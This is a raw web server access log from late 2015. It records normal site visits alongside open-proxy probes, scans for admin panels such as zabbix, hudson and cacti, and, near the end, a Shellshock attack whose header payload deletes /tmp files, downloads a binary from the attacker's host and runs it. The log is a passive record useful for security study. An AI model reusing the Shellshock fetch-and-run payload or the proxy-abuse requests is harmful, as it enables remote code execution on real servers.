202.118.73.69 - - [31/Oct/2015:10:56:00 +0800] "GET /user HTTP/1.1" 304 0 "http://121.42.203.57/notifications" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:56:02 +0800] "GET /user/publish HTTP/1.1" 304 0 "http://121.42.203.57/user" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:56:03 +0800] "GET /user/publish/resources HTTP/1.1" 304 0 "http://121.42.203.57/user/publish" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:56:03 +0800] "GET /static/js/ajaxfileupload.js HTTP/1.1" 404 168 "http://121.42.203.57/user/publish/resources" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:56:19 +0800] "POST /user/publish/resources HTTP/1.1" 200 41 "http://121.42.203.57/user/publish/resources" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:56:19 +0800] "GET /resource HTTP/1.1" 200 3472 "http://121.42.203.57/user/publish/resources" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:57:11 +0800] "GET /user HTTP/1.1" 304 0 "http://121.42.203.57/resource" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:57:15 +0800] "GET /logout HTTP/1.1" 302 0 "http://121.42.203.57/user" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:57:15 +0800] "GET / HTTP/1.1" 200 6786 "http://121.42.203.57/user" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:57:18 +0800] "GET /login HTTP/1.1" 200 4835 "http://121.42.203.57/" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:57:19 +0800] "GET /signUp HTTP/1.1" 200 6406 "http://121.42.203.57/login" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
141.212.121.192 - - [31/Oct/2015:11:16:36 +0800] "GET / HTTP/1.1" 200 6786 "-" "Mozilla/5.0 zgrab/0.x"
146.185.239.100 - - [31/Oct/2015:13:10:35 +0800] "GET http://24x7-allrequestsallowed.com/?PHPSESSID=aab45f4f00143PPRJRT_EBGFQ%40 HTTP/1.1" 200 6786 "-" "-"
91.196.50.33 - - [31/Oct/2015:16:46:01 +0800] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
183.60.48.25 - - [31/Oct/2015:18:49:39 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
183.60.48.25 - - [31/Oct/2015:18:49:40 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
154.87.1.102 - - [31/Oct/2015:19:32:31 +0800] "GET / HTTP/1.1" 200 6786 "-" "-"
61.160.213.110 - - [31/Oct/2015:20:15:34 +0800] "GET http://zc.qq.com/chs/index.html?type=1 HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)"
95.213.187.189 - - [31/Oct/2015:21:09:51 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144629699289&a=PSCN&i=&p= HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
5.178.86.76 - - [01/Nov/2015:01:56:58 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144631421801&a=PSCN&i=&p= HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
185.35.62.11 - - [01/Nov/2015:02:04:10 +0800] "HEAD / HTTP/1.1" 405 0 "-" "-"
183.60.48.25 - - [01/Nov/2015:02:38:18 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
95.213.187.187 - - [01/Nov/2015:06:47:11 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144633163213&a=PSCN&i=&p= HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
183.60.48.25 - - [01/Nov/2015:10:27:58 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
5.178.86.75 - - [01/Nov/2015:11:38:55 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144634913545&a=PSCN&i=&p= HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
91.196.50.33 - - [01/Nov/2015:13:06:45 +0800] "GET http://testp2.czar.bielawa.pl/testproxy.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
121.42.164.186 - - [01/Nov/2015:13:26:34 +0800] "CONNECT www.google.co.uk:443 HTTP/1.1" 400 172 "-" "-"
121.42.0.35 - - [01/Nov/2015:16:13:08 +0800] "GET / HTTP/1.0" 200 6786 "-" "spiderman"
5.178.86.74 - - [01/Nov/2015:16:30:53 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144636665355&a=PSCN&i=&p= HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
121.42.0.35 - - [01/Nov/2015:17:13:46 +0800] "GET / HTTP/1.0" 200 6786 "-" "spiderman"
183.60.48.25 - - [01/Nov/2015:18:25:46 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
95.213.187.189 - - [01/Nov/2015:21:14:21 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144638366153&a=PSCN&i=&p= HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
111.248.98.130 - - [02/Nov/2015:00:33:21 +0800] "CONNECT 163mx00.mxmail.netease.com:25 HTTP/1.0" 400 172 "-" "-"
183.60.48.25 - - [02/Nov/2015:01:53:13 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
5.178.86.76 - - [02/Nov/2015:02:02:50 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144640097107&a=PSCN&i=&p= HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
68.64.169.226 - - [02/Nov/2015:04:49:28 +0800] "OPTIONS / HTTP/1.1" 405 323 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
121.42.164.186 - - [02/Nov/2015:05:15:11 +0800] "CONNECT www.google.co.uk:443 HTTP/1.1" 400 172 "-" "-"
121.42.210.61 - - [02/Nov/2015:05:18:05 +0800] "GET / HTTP/1.1" 200 6786 "-" "-"
121.42.210.61 - - [02/Nov/2015:05:18:05 +0800] "" 400 0 "-" "-"
95.213.187.190 - - [02/Nov/2015:07:01:54 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144641891549&a=PSCN&i=&p= HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
154.87.1.102 - - [02/Nov/2015:07:14:35 +0800] "GET / HTTP/1.1" 200 6786 "-" "-"
121.42.0.34 - - [02/Nov/2015:08:18:16 +0800] "GET / HTTP/1.0" 200 6786 "-" "spiderman"
183.60.48.25 - - [02/Nov/2015:10:08:26 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
121.42.0.33 - - [02/Nov/2015:10:18:36 +0800] "GET / HTTP/1.0" 200 6786 "-" "spiderman"
185.25.148.240 - - [02/Nov/2015:11:25:42 +0800] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
95.213.187.189 - - [02/Nov/2015:11:54:21 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144643646231&a=PSCN&i=&p= HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
37.187.114.171 - - [02/Nov/2015:12:06:58 +0800] "GET /XMII/Illuminator HTTP/1.0" 404 284 "-" "-"
103.240.16.119 - - [02/Nov/2015:17:20:50 +0800] "GET http://www.example.com/ HTTP/1.1" 200 6786 "-" "Mozilla/5.0 (Windows NT 6.1)"
183.60.48.25 - - [02/Nov/2015:18:22:20 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
202.4.35.92 - - [02/Nov/2015:19:42:51 +0800] "GET / HTTP/1.0" 200 6786 "-" "-"
5.178.86.74 - - [02/Nov/2015:21:31:35 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144647109539&a=PSCN&i=&p= HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
183.60.48.25 - - [03/Nov/2015:02:14:00 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
91.196.50.33 - - [03/Nov/2015:06:00:59 +0800] "GET http://testp5.mielno.lubin.pl/testproxy.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
23.104.206.105 - - [03/Nov/2015:07:27:49 +0800] "GET http://www.hotbot.com/ HTTP/1.1" 200 6786 "-" "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)"
23.104.206.105 - - [03/Nov/2015:07:27:50 +0800] "CONNECT developer.apple.com:443 HTTP/1.1" 400 172 "-" "-"
61.160.213.110 - - [03/Nov/2015:08:49:22 +0800] "GET http://zc.qq.com/chs/index.html?type=1 HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)"
121.42.0.34 - - [03/Nov/2015:10:16:04 +0800] "GET / HTTP/1.0" 200 6786 "-" "spiderman"
183.60.48.25 - - [03/Nov/2015:10:20:23 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
182.118.55.124 - - [03/Nov/2015:10:50:43 +0800] "GET / HTTP/1.1" 200 6786 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
78.128.92.194 - - [03/Nov/2015:14:45:06 +0800] "GET / HTTP/1.1" 200 6786 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
154.87.1.102 - - [03/Nov/2015:16:42:08 +0800] "GET / HTTP/1.1" 200 6786 "-" "-"
183.60.48.25 - - [03/Nov/2015:17:08:17 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
182.118.53.74 - - [03/Nov/2015:17:24:11 +0800] "GET / HTTP/1.1" 200 6786 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
120.26.55.211 - - [03/Nov/2015:19:47:34 +0800] "GET /xampp/showcode.php/c:boot.ini?showcode=1 HTTP/1.1" 404 284 "-" "-"
120.26.55.211 - - [03/Nov/2015:19:47:34 +0800] "" 400 0 "-" "-"
120.26.55.211 - - [03/Nov/2015:19:51:43 +0800] "GET /xampp/showcode.php/showcode.php?showcode=1 HTTP/1.1" 404 284 "-" "-"
120.26.55.211 - - [03/Nov/2015:19:51:43 +0800] "" 400 0 "-" "-"
121.42.0.35 - - [03/Nov/2015:19:59:21 +0800] "GET / HTTP/1.0" 200 6786 "-" "spiderman"
5.178.86.78 - - [03/Nov/2015:21:20:39 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144655684063&a=PSCN&i=2032847673&p=80 HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
66.117.9.170 - - [03/Nov/2015:21:42:09 +0800] "OPTIONS / HTTP/1.1" 405 323 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
120.26.55.211 - - [03/Nov/2015:22:29:11 +0800] "GET /hudson HTTP/1.1" 404 284 "-" "-"
120.26.55.211 - - [03/Nov/2015:22:29:11 +0800] "" 400 0 "-" "-"
120.26.55.211 - - [03/Nov/2015:22:30:09 +0800] "GET /hudson HTTP/1.1" 404 284 "-" "-"
120.26.55.211 - - [03/Nov/2015:22:30:09 +0800] "" 400 0 "-" "-"
66.117.9.170 - - [03/Nov/2015:22:34:50 +0800] "OPTIONS / HTTP/1.1" 405 323 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
141.212.122.160 - - [03/Nov/2015:22:39:38 +0800] "GET / HTTP/1.1" 200 6786 "-" "Mozilla/5.0 zgrab/0.x"
121.42.164.186 - - [03/Nov/2015:23:12:24 +0800] "CONNECT www.google.co.uk:443 HTTP/1.1" 400 172 "-" "-"
202.4.35.92 - - [04/Nov/2015:00:15:35 +0800] "GET / HTTP/1.0" 200 6786 "-" "-"
121.42.164.186 - - [04/Nov/2015:01:19:36 +0800] "CONNECT www.google.co.uk:443 HTTP/1.1" 400 172 "-" "-"
5.178.86.78 - - [04/Nov/2015:01:39:33 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144657237459&a=PSCN&i=2032847673&p=80 HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
91.196.50.33 - - [04/Nov/2015:04:49:29 +0800] "GET http://testp2.czar.bielawa.pl/testproxy.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
185.25.148.240 - - [04/Nov/2015:05:30:47 +0800] "GET http://testp2.czar.bielawa.pl/testproxy.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
23.104.206.105 - - [04/Nov/2015:07:55:21 +0800] "GET http://cn.bing.com/ HTTP/1.1" 200 6786 "-" "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)"
23.104.206.105 - - [04/Nov/2015:07:55:22 +0800] "CONNECT www.alipay.com:443 HTTP/1.1" 400 172 "-" "-"
154.87.1.102 - - [04/Nov/2015:09:09:27 +0800] "GET / HTTP/1.1" 200 6786 "-" "-"
120.26.55.211 - - [04/Nov/2015:09:38:44 +0800] "GET /zabbix/ HTTP/1.1" 404 284 "-" "-"
120.26.55.211 - - [04/Nov/2015:09:38:44 +0800] "" 400 0 "-" "-"
183.60.48.25 - - [04/Nov/2015:10:09:00 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
86.60.190.126 - - [04/Nov/2015:10:29:08 +0800] "GET / HTTP/1.1" 400 172 "-" "-"
95.213.187.190 - - [04/Nov/2015:10:35:21 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144660452107&a=PSCN&i=2032847673&p=80 HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
66.117.9.170 - - [04/Nov/2015:11:22:47 +0800] "OPTIONS / HTTP/1.1" 405 323 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
5.178.86.76 - - [04/Nov/2015:15:26:13 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144662197347&a=PSCN&i=2032847673&p=80 HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
120.26.55.211 - - [04/Nov/2015:15:43:20 +0800] "GET /cacti/index.php HTTP/1.1" 404 284 "-" "-"
120.26.55.211 - - [04/Nov/2015:15:43:20 +0800] "" 400 0 "-" "-"
121.42.0.34 - - [04/Nov/2015:15:54:29 +0800] "GET / HTTP/1.0" 200 6786 "-" "spiderman"
120.26.55.211 - - [04/Nov/2015:16:22:09 +0800] "GET /axis2 HTTP/1.1" 404 284 "-" "-"
120.26.55.211 - - [04/Nov/2015:16:22:09 +0800] "" 400 0 "-" "-"
120.26.55.211 - - [04/Nov/2015:16:22:35 +0800] "GET /axis2/ HTTP/1.1" 404 284 "-" "-"
120.26.55.211 - - [04/Nov/2015:16:22:35 +0800] "" 400 0 "-" "-"
120.26.55.211 - - [04/Nov/2015:17:32:17 +0800] "GET /zabbix/ HTTP/1.1" 404 284 "-" "-"
120.26.55.211 - - [04/Nov/2015:17:32:17 +0800] "" 400 0 "-" "-"
183.60.48.25 - - [04/Nov/2015:18:08:44 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
222.45.51.236 - - [04/Nov/2015:20:31:46 +0800] "GET / HTTP/1.1" 200 6786 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1"
120.26.55.211 - - [04/Nov/2015:21:07:29 +0800] "GET /server-status/ HTTP/1.1" 404 284 "-" "-"
120.26.55.211 - - [04/Nov/2015:21:07:29 +0800] "" 400 0 "-" "-"
91.196.50.33 - - [04/Nov/2015:23:29:59 +0800] "GET http://testp2.czar.bielawa.pl/testproxy.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
146.185.239.100 - - [04/Nov/2015:23:56:23 +0800] "GET http://24x7-allrequestsallowed.com/?PHPSESSID=aab45f4f00143PPRJRT_EBGFQ%40 HTTP/1.1" 200 6786 "-" "-"
154.87.1.102 - - [05/Nov/2015:01:21:36 +0800] "GET / HTTP/1.1" 200 6786 "-" "-"
183.60.48.25 - - [05/Nov/2015:02:06:22 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
121.42.0.17 - - [05/Nov/2015:02:27:05 +0800] "GET /hudson/ HTTP/1.1" 404 284 "http://121.42.203.57/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.1079872)"
121.42.0.17 - - [05/Nov/2015:02:27:07 +0800] "GET / HTTP/1.1" 200 6786 "http://121.42.203.57/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.1079872)"
121.42.0.17 - - [05/Nov/2015:02:27:12 +0800] "GET /login.jsp HTTP/1.1" 404 284 "http://121.42.203.57/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.1079872)"
121.42.0.17 - - [05/Nov/2015:02:27:16 +0800] "GET /index.html HTTP/1.1" 404 284 "http://121.42.203.57/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.1079872)"
121.42.0.17 - - [05/Nov/2015:02:27:18 +0800] "GET /server-status/ HTTP/1.1" 404 284 "http://121.42.203.57/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.1079872)"
121.42.0.17 - - [05/Nov/2015:02:27:28 +0800] "GET /console/ HTTP/1.1" 404 284 "http://121.42.203.57/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.1079872)"
121.42.0.17 - - [05/Nov/2015:02:27:34 +0800] "GET /zabbix/ HTTP/1.1" 404 284 "http://121.42.203.57/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.1079872)"
121.42.0.17 - - [05/Nov/2015:02:27:36 +0800] "GET / HTTP/1.1" 200 6786 "http://121.42.203.57/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.1079872)"
121.42.0.17 - - [05/Nov/2015:02:27:42 +0800] "GET /cacti/index.php HTTP/1.1" 404 284 "http://121.42.203.57/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.1079872)"
121.42.0.17 - - [05/Nov/2015:02:27:43 +0800] "GET /index.php HTTP/1.1" 404 284 "http://121.42.203.57/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.1079872)"
121.42.0.17 - - [05/Nov/2015:02:27:45 +0800] "GET / HTTP/1.1" 200 6786 "http://121.42.203.57/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.1079872)"
121.42.0.17 - - [05/Nov/2015:02:27:47 +0800] "GET /axis2/ HTTP/1.1" 404 284 "http://121.42.203.57/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.1079872)"
121.42.0.17 - - [05/Nov/2015:02:27:53 +0800] "GET /solr/ HTTP/1.1" 404 284 "http://121.42.203.57/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.1079872)"
121.42.0.17 - - [05/Nov/2015:02:27:55 +0800] "GET / HTTP/1.1" 200 6786 "http://121.42.203.57/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.1079872)"
121.42.0.17 - - [05/Nov/2015:02:28:03 +0800] "GET / HTTP/1.1" 200 6786 "http://121.42.203.57/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.1079872)"
121.42.195.6 - - [05/Nov/2015:03:57:04 +0800] "CONNECT www.google.co.uk:443 HTTP/1.1" 400 172 "-" "-"
95.213.187.188 - - [05/Nov/2015:04:42:59 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144666978095&a=PSCN&i=2032847673&p=80 HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
121.42.210.61 - - [05/Nov/2015:05:17:10 +0800] "GET / HTTP/1.1" 200 6786 "-" "-"
121.42.210.61 - - [05/Nov/2015:05:17:10 +0800] "" 400 0 "-" "-"
104.192.0.226 - - [05/Nov/2015:05:28:21 +0800] "GET /menuBcm.js HTTP/1.0" 404 284 "-" "-"
61.160.213.110 - - [05/Nov/2015:07:52:58 +0800] "GET http://zc.qq.com/chs/index.html?type=1 HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)"
141.212.122.112 - - [05/Nov/2015:07:59:57 +0800] "CONNECT proxytest.zmap.io:80 HTTP/1.1" 400 172 "-" "-"
95.213.187.189 - - [05/Nov/2015:09:16:54 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144668621453&a=PSCN&i=2032847673&p=80 HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
183.60.48.25 - - [05/Nov/2015:10:06:20 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
5.178.86.77 - - [05/Nov/2015:13:56:40 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144670300191&a=PSCN&i=2032847673&p=80 HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
58.101.201.104 - - [05/Nov/2015:15:58:51 +0800] "GET / HTTP/1.1" 200 6786 "() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget 58.101.201.104:8080/vcers -O /tmp/China.Z-ldif\x81 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-ldif\x81 >> /tmp/Run.sh;echo /tmp/China.Z-ldif\x81 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22" "() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget 58.101.201.104:8080/vcers -O /tmp/China.Z-ldif\x81 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-ldif\x81 >> /tmp/Run.sh;echo /tmp/China.Z-ldif\x81 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22"
182.118.55.117 - - [05/Nov/2015:16:33:38 +0800] "GET / HTTP/1.1" 200 6786 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
121.42.0.34 - - [05/Nov/2015:16:41:12 +0800] "GET / HTTP/1.0" 200 6786 "-" "spiderman"
183.60.48.25 - - [05/Nov/2015:18:15:28 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
121.42.0.34 - - [05/Nov/2015:18:17:54 +0800] "GET / HTTP/1.0" 200 6786 "-" "spiderman"
5.178.86.74 - - [05/Nov/2015:18:28:26 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144671930657&a=PSCN&i=2032847673&p=80 HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
154.87.1.102 - - [05/Nov/2015:18:29:49 +0800] "GET / HTTP/1.1" 200 6786 "-" "-"
111.248.114.113 - - [05/Nov/2015:18:51:29 +0800] "CONNECT 126mx01.mxmail.netease.com:25 HTTP/1.0" 400 172 "-" "-"
120.25.2.162 - - [05/Nov/2015:19:47:01 +0800] "GET / HTTP/1.1" 200 6786 "-" "-"
120.25.2.162 - - [05/Nov/2015:19:47:01 +0800] "" 400 0 "-" "-"
223.95.73.216 - - [05/Nov/2015:20:38:42 +0800] "GET http://wap.ip138.com/ HTTP/1.1" 200 6786 "-" "Apache-HttpClient/4.5 (Java/1.7.0_45)"
62.210.88.201 - - [05/Nov/2015:20:49:01 +0800] "GET http://51.254.206.142/httptest.php HTTP/1.1" 404 284 "-" "-"
62.210.88.201 - - [05/Nov/2015:20:49:53 +0800] "GET http://www.google.pl/search?q=google&num=100&start=100 HTTP/1.1" 404 284 "-" "-"
185.25.148.240 - - [05/Nov/2015:21:02:27 +0800] "GET http://testp2.czar.bielawa.pl/testproxy.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
222.45.51.236 - - [05/Nov/2015:22:09:41 +0800] "GET / HTTP/1.1" 200 6786 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1"
95.213.187.187 - - [05/Nov/2015:23:10:32 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144673623349&a=PSCN&i=2032847673&p=80 HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
183.60.48.25 - - [06/Nov/2015:01:45:58 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
141.212.122.64 - - [06/Nov/2015:02:12:03 +0800] "GET /x HTTP/1.1" 400 172 "-" "Telesphoreo"
61.160.213.110 - - [06/Nov/2015:02:44:10 +0800] "GET http://zc.qq.com/chs/index.html?type=1 HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)"
117.88.162.31 - - [06/Nov/2015:03:28:16 +0800] "GET http://www.baidu.com HTTP/1.1" 200 6786 "-" "-"
117.88.162.31 - - [06/Nov/2015:03:28:18 +0800] "GET http://www.baidu.com HTTP/1.1" 200 6786 "-" "-"
95.213.187.187 - - [06/Nov/2015:03:57:12 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144675343255&a=PSCN&i=2032847673&p=80 HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
62.210.88.201 - - [06/Nov/2015:05:57:01 +0800] "GET http://www.google.pl/search?q=google&num=100&start=100 HTTP/1.1" 404 284 "-" "-"
